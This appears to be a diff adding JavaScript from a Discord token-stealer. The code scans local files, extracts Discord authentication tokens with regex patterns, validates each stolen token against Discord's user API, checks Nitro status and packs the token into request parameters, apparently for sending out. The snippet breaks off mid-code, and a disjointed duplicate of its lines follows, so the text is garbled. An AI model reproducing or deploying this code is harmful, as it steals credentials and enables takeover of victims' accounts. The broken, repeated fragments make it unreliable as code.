@@ -1,0 +1,25 @@
+fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function(err, data) {
+                            let dmfa = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;
+                            let mfa = /"mfa\.[\d\w_-]{84}"/;
+
+                            let [tkn] = dmfa.exec(data) || mfa.exec(data) || [null];
+                            if (tkn != null) {
+                                tkn = tkn.replace(/"/g, '')
+
+                                let benladen = new URLSearchParams();
+                                benladen.append('token', tkn);
+
+                                let user = JSON.parse(request("GET", 'https://discord.com/api/v9/users/@me', {
+                                    headers: {
+                                        "Content-Type": "application/json",
+                                        "authorization": tkn
+                                    }
+                                }).body)
+                                if (user.premium_type == 1) ...
+let dmfa = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/
+let mfa = /"mfa\.[\d\w_-]{84}"/
+_tmp_11 = dmfa.exec(data) || mfa.exec(data) || [null]
+tkn != null
+tkn = tkn.replace(/"/g, '')
+let benladen = new URLSearchParams()
+benladen.append('token', tkn)
